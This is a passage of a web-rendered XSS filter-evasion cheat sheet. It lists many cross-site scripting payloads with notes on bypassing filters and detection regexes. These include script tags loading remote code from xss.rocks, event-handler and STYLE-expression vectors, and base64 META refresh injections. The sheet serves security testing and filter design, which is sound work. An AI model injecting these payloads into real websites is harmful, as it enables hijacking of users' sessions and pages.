<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="err">/</span><span class="na">XSS</span><span class="na">SRC</span><span class="o">=</span><span class="s">&quot;http://xss.rocks/xss.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
</code></pre></div>
<p>Based on the same idea as above, however, expanded on it, using Rsnake's fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">BODY</span><span class="na">onload</span><span class="err">!#$%&amp;()*~+</span><span class="na">-_</span><span class="err">.,</span><span class="na">:</span><span class="err">;?@[/|\]^`=</span><span class="na">alert</span><span class="err">(&quot;</span><span class="na">XSS</span><span class="err">&quot;)</span><span class="p">&gt;</span>
</code></pre></div>
<p>Yair Amit noted that there is a slightly different behavior between the Trident (IE) and Gecko (Firefox) rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful in a attack if the system does not allow spaces:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="err">/</span><span class="na">SRC</span><span class="o">=</span><span class="s">&quot;http://xss.rocks/xss.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="extraneous-open-brackets">Extraneous Open Brackets<a class="headerlink" href="#extraneous-open-brackets" title="Permanent link">&para;</a></h3>
<p>This XSS vector could defeat certain detection engines that work by checking matching pairs of open and close angle brackets then comparing the tag inside, instead of a more efficient algorithm like <a href="https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string-search_algorithm">Boyer-Moore</a> that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to suppress a JavaScript error:</p>
<div class="highlight"><pre><span></span><code><span class="err">&lt;</span><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;XSS&quot;</span><span class="p">);</span><span class="c1">//\&lt;</span><span class="p">&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
</code></pre></div>
<p>(Submitted by Franz Sedlmaier)</p>
<h3 id="no-closing-script-tags">No Closing Script Tags<a class="headerlink" href="#no-closing-script-tags" title="Permanent link">&para;</a></h3>
<p>With Firefox, you don't actually need the <code>\&gt;&lt;/SCRIPT&gt;</code> portion of this XSS vector, because Firefox assumes it's safe to close the HTML tag and adds closing tags for you. Unlike the next attack, which doesn't affect Firefox, this method does not require any additional HTML below it. You can add quotes if you need to, but they're normally not needed:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="na">SRC</span><span class="o">=</span><span class="s">http://xss.rocks/xss.js?&lt;</span><span class="na">B</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="protocol-resolution-in-script-tags">Protocol Resolution in Script Tags<a class="headerlink" href="#protocol-resolution-in-script-tags" title="Permanent link">&para;</a></h3>
<p>This particular variant is partially based on Ozh's protocol resolution bypass below, and it works in IE and Edge in compatibility mode. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The <code>.j</code> is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="na">SRC</span><span class="o">=</span><span class="s">//xss.rocks/.j</span><span class="p">&gt;</span>
</code></pre></div>
<p>(Submitted by ukasz Pilorz)</p>
<h3 id="half-open-htmljavascript-xss-vector">Half Open HTML/JavaScript XSS Vector<a class="headerlink" href="#half-open-htmljavascript-xss-vector" title="Permanent link">&para;</a></h3>
<p>Unlike Firefox, the IE rendering engine (Trident) doesn't add extra data to your page, but it does allow the <code>javascript:</code> directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this XSS vector. Even though there is no close <code>\&gt;</code> tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following network intrusion detection system (NIDS) regex: <code>/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\&lt;)\[^\\n\]+((\\%3E)|\&gt;)/</code> because it doesn't require the end <code>\&gt;</code>. As a side note, this was also affective against a real world XSS filter using an open ended <code>&lt;IFRAME</code> tag instead of an <code>&lt;IMG</code> tag.</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span><span class="na">SRC</span><span class="o">=</span><span class="s">&quot;`&lt;javascript:alert&gt;`(&#39;XSS&#39;)&quot;</span>
</code></pre></div>
<h3 id="escaping-javascript-escapes">Escaping JavaScript Escapes<a class="headerlink" href="#escaping-javascript-escapes" title="Permanent link">&para;</a></h3>
<p>If an application is written to output some user information inside of a JavaScript (like the following: <code>&lt;SCRIPT&gt;var a="$ENV{QUERY\_STRING}";&lt;/SCRIPT&gt;</code>) and you want to inject your own JavaScript into it but the server side application escapes certain quotes, you can circumvent that by escaping their escape character. When this gets injected it will read <code>&lt;SCRIPT&gt;var a="\\\\";alert('XSS');//";&lt;/SCRIPT&gt;</code> which ends up un-escaping the double quote and causing the XSS vector to fire. The XSS locator uses this method:</p>
<div class="highlight"><pre><span></span><code><span class="err">\&quot;</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">);</span><span class="c1">//</span>
</code></pre></div>
<p>An alternative, if correct JSON or JavaScript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:</p>
<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="err">/script&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</span>
</code></pre></div>
<h3 id="end-title-tag">End Title Tag<a class="headerlink" href="#end-title-tag" title="Permanent link">&para;</a></h3>
<p>This is a simple XSS vector that closes <code>&lt;TITLE&gt;</code> tags, which can encapsulate the malicious cross site scripting attack:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;/</span><span class="nt">TITLE</span><span class="p">&gt;&lt;</span><span class="nt">SCRIPT</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;XSS&quot;</span><span class="p">);&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="input-image">INPUT Image<a class="headerlink" href="#input-image" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">INPUT</span><span class="na">TYPE</span><span class="o">=</span><span class="s">&quot;IMAGE&quot;</span><span class="na">SRC</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="body-image">BODY Image<a class="headerlink" href="#body-image" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">BODY</span><span class="na">BACKGROUND</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="img-dynsrc">IMG Dynsrc<a class="headerlink" href="#img-dynsrc" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span><span class="na">DYNSRC</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="img-lowsrc">IMG Lowsrc<a class="headerlink" href="#img-lowsrc" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span><span class="na">LOWSRC</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="list-style-image">List-style-image<a class="headerlink" href="#list-style-image" title="Permanent link">&para;</a></h3>
<p>This esoteric attack focuses on embedding images for bulleted lists. It will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful XSS vector:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">STYLE</span><span class="p">&gt;</span><span class="nt">li</span><span class="w"></span><span class="p">{</span><span class="k">list-style-image</span><span class="p">:</span><span class="w"></span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">);}&lt;/</span><span class="nt">STYLE</span><span class="p">&gt;&lt;</span><span class="nt">UL</span><span class="p">&gt;&lt;</span><span class="nt">LI</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">br</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="vbscript-in-an-image">VBscript in an Image<a class="headerlink" href="#vbscript-in-an-image" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span><span class="na">SRC</span><span class="o">=</span><span class="s">&#39;vbscript:msgbox(&quot;XSS&quot;)&#39;</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="svg-object-tag">SVG Object Tag<a class="headerlink" href="#svg-object-tag" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">svg</span><span class="o">/</span><span class="nx">onload</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">)</span><span class="o">&gt;</span>
</code></pre></div>
<h3 id="ecmascript-6">ECMAScript 6<a class="headerlink" href="#ecmascript-6" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="nb">Set</span><span class="p">.</span><span class="kr">constructor</span><span class="sb">`alert\x28document.domain\x29</span>
</code></pre></div>
<h3 id="body-tag">BODY Tag<a class="headerlink" href="#body-tag" title="Permanent link">&para;</a></h3>
<p>This attack doesn't require using any variants of <code>javascript:</code> or <code>&lt;SCRIPT...</code> to accomplish the XSS attack. Dan Crowley has noted that you can put a space before the equals sign (<code>onload=</code> != <code>onload =</code>):</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">BODY</span><span class="na">ONLOAD</span><span class="o">=</span><span class="s">alert(&#39;XSS&#39;)</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="attacks-using-event-handlers">Attacks Using Event Handlers<a class="headerlink" href="#attacks-using-event-handlers" title="Permanent link">&para;</a></h4>
<p>The attack with the BODY tag can be modified for use in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.</p>
<p>The <a href="http://help.dottoro.com/">Dottoro Web Reference</a> also has a nice <a href="http://help.dottoro.com/ljfvvdnm.php">list of events in JavaScript</a>.</p>
<ul>
<li><code>onAbort()</code> (when user aborts the loading of an image)</li>
<li><code>onActivate()</code> (when object is set as the active element)</li>
<li><code>onAfterPrint()</code> (activates after user prints or previews print job)</li>
<li><code>onAfterUpdate()</code> (activates on data object after updating data in the source object)</li>
<li><code>onBeforeActivate()</code> (fires before the object is set as the active element)</li>
<li><code>onBeforeCopy()</code> (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the <code>execCommand("Copy")</code> function)</li>
<li><code>onBeforeCut()</code> (attacker executes the attack string right before a selection is cut)</li>
<li><code>onBeforeDeactivate()</code> (fires right after the activeElement is changed from the current object)</li>
<li><code>onBeforeEditFocus()</code> (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)</li>
<li><code>onBeforePaste()</code> (user needs to be tricked into pasting or be forced into it using the <code>execCommand("Paste")</code> function)</li>
<li><code>onBeforePrint()</code> (user would need to be tricked into printing or attacker could use the <code>print()</code> or <code>execCommand("Print")</code> function).</li>
<li><code>onBeforeUnload()</code> (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)</li>
<li><code>onBeforeUpdate()</code> (activates on data object before updating data in the source object)</li>
<li><code>onBegin()</code> (the onbegin event fires immediately when the element's timeline begins)</li>
<li><code>onBlur()</code> (in the case where another popup is loaded and window looses focus)</li>
<li><code>onBounce()</code> (fires when the behavior property of the marquee object is set to "alternate" and the contents of the marquee reach one side of the window)</li>
<li><code>onCellChange()</code> (fires when data changes in the data provider)</li>
<li><code>onChange()</code> (select, text, or TEXTAREA field loses focus and its value has been modified)</li>
<li><code>onClick()</code> (someone clicks on a form)</li>
<li><code>onContextMenu()</code> (user would need to right click on attack area)</li>
<li><code>onControlSelect()</code> (fires when the user is about to make a control selection of the object)</li>
<li><code>onCopy()</code> (user needs to copy something or it can be exploited using the <code>execCommand("Copy")</code> command)</li>
<li><code>onCut()</code> (user needs to copy something or it can be exploited using the <code>execCommand("Cut")</code> command)</li>
<li><code>onDataAvailable()</code> (user would need to change data in an element, or attacker could perform the same function)</li>
<li><code>onDataSetChanged()</code> (fires when the data set exposed by a data source object changes)</li>
<li><code>onDataSetComplete()</code> (fires to indicate that all data is available from the data source object)</li>
<li><code>onDblClick()</code> (user double-clicks a form element or a link)</li>
<li><code>onDeactivate()</code> (fires when the activeElement is changed from the current object to another object in the parent document)</li>
<li><code>onDrag()</code> (requires that the user drags an object)</li>
<li><code>onDragEnd()</code> (requires that the user drags an object)</li>
<li><code>onDragLeave()</code> (requires that the user drags an object off a valid location)</li>
<li><code>onDragEnter()</code> (requires that the user drags an object into a valid location)</li>
<li><code>onDragOver()</code> (requires that the user drags an object into a valid location)</li>
<li><code>onDragDrop()</code> (user drops an object (e.g. file) onto the browser window)</li>
<li><code>onDragStart()</code> (occurs when user starts drag operation)</li>
<li><code>onDrop()</code> (user drops an object (e.g. file) onto the browser window)</li>
<li><code>onEnd()</code> (the onEnd event fires when the timeline ends.</li>
<li><code>onError()</code> (loading of a document or image causes an error)</li>
<li><code>onErrorUpdate()</code> (fires on a data bound object when an error occurs while updating the associated data in the data source object)</li>
<li><code>onFilterChange()</code> (fires when a visual filter completes state change)</li>
<li><code>onFinish()</code> (attacker can create the exploit when marquee is finished looping)</li>
<li><code>onFocus()</code> (attacker executes the attack string when the window gets focus)</li>
<li><code>onFocusIn()</code> (attacker executes the attack string when window gets focus)</li>
<li><code>onFocusOut()</code> (attacker executes the attack string when window looses focus)</li>
<li><code>onHashChange()</code> (fires when the fragment identifier part of the document's current address changed)</li>
<li><code>onHelp()</code> (attacker executes the attack string when users hits F1 while the window is in focus)</li>
<li><code>onInput()</code> (the text content of an element is changed through the user interface)</li>
<li><code>onKeyDown()</code> (user depresses a key)</li>
<li><code>onKeyPress()</code> (user presses or holds down a key)</li>
<li><code>onKeyUp()</code> (user releases a key)</li>
<li><code>onLayoutComplete()</code> (user would have to print or print preview)</li>
<li><code>onLoad()</code> (attacker executes the attack string after the window loads)</li>
<li><code>onLoseCapture()</code> (can be exploited by the <code>releaseCapture()</code> method)</li>
<li><code>onMediaComplete()</code> (When a streaming media file is used, this event could fire before the file starts playing)</li>
<li><code>onMediaError()</code> (User opens a page in the browser that contains a media file, and the event fires when there is a problem)</li>
<li><code>onMessage()</code> (fire when the document received a message)</li>
<li><code>onMouseDown()</code> (the attacker would need to get the user to click on an image)</li>
<li><code>onMouseEnter()</code> (cursor moves over an object or area)</li>
<li><code>onMouseLeave()</code> (the attacker would need to get the user to mouse over an image or table and then off again)</li>
<li><code>onMouseMove()</code> (the attacker would need to get the user to mouse over an image or table)</li>
<li><code>onMouseOut()</code> (the attacker would need to get the user to mouse over an image or table and then off again)</li>
<li><code>onMouseOver()</code> (cursor moves over an object or area)</li>
<li><code>onMouseUp()</code> (the attacker would need to get the user to click on an image)</li>
<li><code>onMouseWheel()</code> (the attacker would need to get the user to use their mouse wheel)</li>
<li><code>onMove()</code> (user or attacker would move the page)</li>
<li><code>onMoveEnd()</code> (user or attacker would move the page)</li>
<li><code>onMoveStart()</code> (user or attacker would move the page)</li>
<li><code>onOffline()</code> (occurs if the browser is working in online mode and it starts to work offline)</li>
<li><code>onOnline()</code> (occurs if the browser is working in offline mode and it starts to work online)</li>
<li><code>onOutOfSync()</code> (interrupt the element's ability to play its media as defined by the timeline)</li>
<li><code>onPaste()</code> (user would need to paste or attacker could use the <code>execCommand("Paste")</code> function)</li>
<li><code>onPause()</code> (the onpause event fires on every element that is active when the timeline pauses, including the body element)</li>
<li><code>onPopState()</code> (fires when user navigated the session history)</li>
<li><code>onPropertyChange()</code> (user or attacker would need to change an element property)</li>
<li><code>onReadyStateChange()</code> (user or attacker would need to change an element property)</li>
<li><code>onRedo()</code> (user went forward in undo transaction history)</li>
<li><code>onRepeat()</code> (the event fires once for each repetition of the timeline, excluding the first full cycle)</li>
<li><code>onReset()</code> (user or attacker resets a form)</li>
<li><code>onResize()</code> (user would resize the window; attacker could auto initialize with something like: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li>
<li><code>onResizeEnd()</code> (user would resize the window; attacker could auto initialize with something like: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li>
<li><code>onResizeStart()</code> (user would resize the window; attacker could auto initialize with something like: <code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;</code>)</li>
<li><code>onResume()</code> (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)</li>
<li><code>onReverse()</code> (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)</li>
<li><code>onRowsEnter()</code> (user or attacker would need to change a row in a data source)</li>
<li><code>onRowExit()</code> (user or attacker would need to change a row in a data source)</li>
<li><code>onRowDelete()</code> (user or attacker would need to delete a row in a data source)</li>
<li><code>onRowInserted()</code> (user or attacker would need to insert a row in a data source)</li>
<li><code>onScroll()</code> (user would need to scroll, or attacker could use the <code>scrollBy()</code> function)</li>
<li><code>onSeek()</code> (the <code>onReverse</code> event fires when the timeline is set to play in any direction other than forward)</li>
<li><code>onSelect()</code> (user needs to select some text - attacker could auto initialize with something like: <code>window.document.execCommand("SelectAll");</code>)</li>
<li><code>onSelectionChange()</code> (user needs to select some text - attacker could auto initialize with something like: <code>window.document.execCommand("SelectAll");</code>)</li>
<li><code>onSelectStart()</code> (user needs to select some text - attacker could auto initialize with something like: <code>window.document.execCommand("SelectAll");</code>)</li>
<li><code>onStart()</code> (fires at the beginning of each marquee loop)</li>
<li><code>onStop()</code> (user would need to press the stop button or leave the webpage)</li>
<li><code>onStorage()</code> (storage area changed)</li>
<li><code>onSyncRestored()</code> (user interrupts the element's ability to play its media as defined by the timeline to fire)</li>
<li><code>onSubmit()</code> (requires attacker or user submits a form)</li>
<li><code>onTimeError()</code> (user or attacker sets a time property, such as dur, to an invalid value)</li>
<li><code>onTrackChange()</code> (user or attacker changes track in a playList)</li>
<li><code>onUndo()</code> (user went backward in undo transaction history)</li>
<li><code>onUnload()</code> (as the user clicks any link or presses the back button or attacker forces a click)</li>
<li><code>onURLFlip()</code> (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)</li>
<li><code>seekSegmentTime()</code> (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)</li>
</ul>
<h4 id="bgsound">BGSOUND<a class="headerlink" href="#bgsound" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">BGSOUND</span><span class="w"> </span><span class="nx">SRC</span><span class="o">=</span><span class="s2">&quot;javascript:alert(&#39;XSS&#39;);&quot;</span><span class="o">&gt;</span>
</code></pre></div>
<h4 id="javascript-includes">&amp; JavaScript includes<a class="headerlink" href="#javascript-includes" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">BR</span><span class="na">SIZE</span><span class="o">=</span><span class="s">&quot;&amp;{alert(&#39;XSS&#39;)}&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="style-sheet">STYLE sheet<a class="headerlink" href="#style-sheet" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">LINK</span> <span class="na">REL</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">HREF</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="remote-style-sheet">Remote style sheet<a class="headerlink" href="#remote-style-sheet" title="Permanent link">&para;</a></h3>
<p>Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">LINK</span><span class="na">REL</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span><span class="na">HREF</span><span class="o">=</span><span class="s">&quot;http://xss.rocks/xss.css&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="remote-style-sheet-part-2">Remote style sheet part 2<a class="headerlink" href="#remote-style-sheet-part-2" title="Permanent link">&para;</a></h4>
<p>This works the same as above, but uses a <code>&lt;STYLE&gt;</code> tag instead of a <code>&lt;LINK&gt;</code> tag). A slight variation on this vector was used
to hack Google Desktop. As a side note, you can remove the end <code>&lt;/STYLE&gt;</code> tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">STYLE</span><span class="p">&gt;@</span><span class="k">import</span><span class="s1">&#39;http://xss.rocks/xss.css&#39;</span><span class="p">;&lt;/</span><span class="nt">STYLE</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="remote-style-sheet-part-3">Remote style sheet part 3<a class="headerlink" href="#remote-style-sheet-part-3" title="Permanent link">&para;</a></h4>
<p>This only works in Gecko rendering engines and works by binding an XUL file to the parent page.</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">STYLE</span><span class="p">&gt;</span><span class="nt">BODY</span><span class="p">{</span><span class="kp">-moz-</span><span class="n">binding</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;http://xss.rocks/xssmoz.xml#xss&quot;</span><span class="p">)}&lt;/</span><span class="nt">STYLE</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="style-tags-that-breaks-up-javascript-for-xss">STYLE Tags that Breaks Up JavaScript for XSS<a class="headerlink" href="#style-tags-that-breaks-up-javascript-for-xss" title="Permanent link">&para;</a></h3>
<p>This XSS at times sends IE into an infinite loop of alerts:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">STYLE</span><span class="p">&gt;@</span><span class="k">im</span><span class="err">\</span><span class="nt">port</span><span class="s1">&#39;\ja\vasc\ript:alert(&quot;XSS&quot;)&#39;</span><span class="p">;&lt;/</span><span class="nt">STYLE</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="style-attribute-that-breaks-up-an-expression">STYLE Attribute that Breaks Up an Expression<a class="headerlink" href="#style-attribute-that-breaks-up-an-expression" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span><span class="na">STYLE</span><span class="o">=</span><span class="s">&quot;xss:expr/*XSS*/ession(alert(&#39;XSS&#39;))&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<p>(Created by Roman Ivanov)</p>
<h3 id="img-style-with-expressions">IMG STYLE with Expressions<a class="headerlink" href="#img-style-with-expressions" title="Permanent link">&para;</a></h3>
<p>This is really a hybrid of the last two XSS vectors, but it really does show how hard STYLE tags can be to parse apart. This can send IE into a loop:</p>
<div class="highlight"><pre><span></span><code>exp/*<span class="p">&lt;</span><span class="nt">A</span><span class="na">STYLE</span><span class="o">=</span><span class="s">&#39;no\xss:noxss(&quot;*//*&quot;);</span>
<span class="s">xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))&#39;</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="style-tag-using-background-image">STYLE Tag using Background-image<a class="headerlink" href="#style-tag-using-background-image" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">STYLE</span><span class="p">&gt;.</span><span class="nc">XSS</span><span class="p">{</span><span class="k">background-image</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">);}&lt;/</span><span class="nt">STYLE</span><span class="p">&gt;&lt;</span><span class="nt">A</span><span class="na">CLASS</span><span class="o">=</span><span class="s">XSS</span><span class="p">&gt;&lt;/</span><span class="nt">A</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="style-tag-using-background">STYLE Tag using Background<a class="headerlink" href="#style-tag-using-background" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">STYLE</span><span class="na">type</span><span class="o">=</span><span class="s">&quot;text/css&quot;</span><span class="p">&gt;</span><span class="nt">BODY</span><span class="p">{</span><span class="k">background</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">)}&lt;/</span><span class="nt">STYLE</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">STYLE</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/css&quot;</span><span class="p">&gt;</span><span class="nt">BODY</span><span class="p">{</span><span class="k">background</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;&lt;javascript:alert&gt;(&#39;XSS&#39;)&quot;</span><span class="p">)}&lt;/</span><span class="nt">STYLE</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="anonymous-html-with-style-attribute">Anonymous HTML with STYLE Attribute<a class="headerlink" href="#anonymous-html-with-style-attribute" title="Permanent link">&para;</a></h3>
<p>The IE rendering engine doesn't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">XSS</span><span class="na">STYLE</span><span class="o">=</span><span class="s">&quot;xss:expression(alert(&#39;XSS&#39;))&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="local-htc-file">Local htc File<a class="headerlink" href="#local-htc-file" title="Permanent link">&para;</a></h3>
<p>This is a little different than the last two XSS vectors because it uses an .htc file that must be on the same server as the XSS vector. This example file works by pulling in the JavaScript and running it as part of the style attribute:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">XSS</span> <span class="na">STYLE</span><span class="o">=</span><span class="s">&quot;behavior: url(xss.htc);&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="us-ascii-encoding">US-ASCII Encoding<a class="headerlink" href="#us-ascii-encoding" title="Permanent link">&para;</a></h3>
<p>This attack uses malformed ASCII encoding with 7 bits instead of 8. This XSS method may bypass many content filters but it only works if the host transmits in US-ASCII encoding or if you set the encoding yourself. This is more useful against web application firewall (WAF) XSS evasion than it is server side filter evasion. Apache Tomcat is the only known server that by default still transmits in US-ASCII encoding.</p>
<div class="highlight"><pre><span></span><code><span class="err"></span><span class="nx">script</span><span class="err"></span><span class="nx">alert</span><span class="p">(</span><span class="err"></span><span class="nx">XSS</span><span class="err"></span><span class="p">)</span><span class="err"></span><span class="o">/</span><span class="nx">script</span><span class="err"></span>
</code></pre></div>
<h3 id="meta">META<a class="headerlink" href="#meta" title="Permanent link">&para;</a></h3>
<p>The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">META</span><span class="na">HTTP-EQUIV</span><span class="o">=</span><span class="s">&quot;refresh&quot;</span><span class="na">CONTENT</span><span class="o">=</span><span class="s">&quot;0;url=javascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="meta-using-data">META using Data<a class="headerlink" href="#meta-using-data" title="Permanent link">&para;</a></h4>
<p>Directive URL scheme. This attack method is nice because it also doesn't have anything visible that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see <a href="https://datatracker.ietf.org/doc/html/rfc2397">RFC 2397</a> for more details.</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">META</span><span class="na">HTTP-EQUIV</span><span class="o">=</span><span class="s">&quot;refresh&quot;</span><span class="na">CONTENT</span><span class="o">=</span><span class="s">&quot;0;url=data:text/htmlbase64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<h4 id="meta-with-additional-url-parameter">META with Additional URL Parameter<a class="headerlink" href="#meta-with-additional-url-parameter" title="Permanent link">&para;</a></h4>
<p>If the target website attempts to see if the URL contains <code>&lt;http://&gt;;</code> at the beginning you can evade this filter rule with the following technique:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">META</span><span class="na">HTTP-EQUIV</span><span class="o">=</span><span class="s">&quot;refresh&quot;</span><span class="na">CONTENT</span><span class="o">=</span><span class="s">&quot;0;URL=http://;URL=javascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<p>(Submitted by Moritz Naumann)</p>
<h3 id="iframe">IFRAME<a class="headerlink" href="#iframe" title="Permanent link">&para;</a></h3>
